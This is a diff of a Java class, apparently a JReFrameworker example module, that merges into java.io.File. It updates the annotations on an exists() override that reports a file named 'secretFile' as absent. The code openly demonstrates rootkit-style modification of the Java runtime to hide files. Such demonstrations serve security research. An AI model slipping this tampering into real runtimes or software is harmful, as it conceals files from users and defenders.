@@ -1,9 +1,12 @@
 package java.io;
 
-import jreframeworker.operations.annotations.jref_overwrite;
-import jreframeworker.operations.interfaces.JREF_Merge;
+import jreframeworker.annotations.methods.MergeMethod;
+import jreframeworker.annotations.types.MergeType;
 
-public class HiddenFile extends File implements JREF_Merge {
+@MergeType
+public class HiddenFile extends File {
+
+	private static final long serialVersionUID = 1L;
 
 	/**
 	 * This method initializes a new <code>File</code> object to represent a
@@ -17,10 +20,9 @@ public class HiddenFile extends File implements JREF_Merge {
 
 	/**
 	 * Overwrites the behavior of File.exists() to return false if
-	 * the file's name is "secretFile" even if the file actually exists.
-	 * Method behaves normally in all other cases.
+	 * the file's name is "secretFile" even if the file actually exists
 	 */
-	@jref_overwrite
+	@MergeMethod
 	public boolean exists() {
 		if (isFile() && getName().equals("secretFile")) {
 			return false;
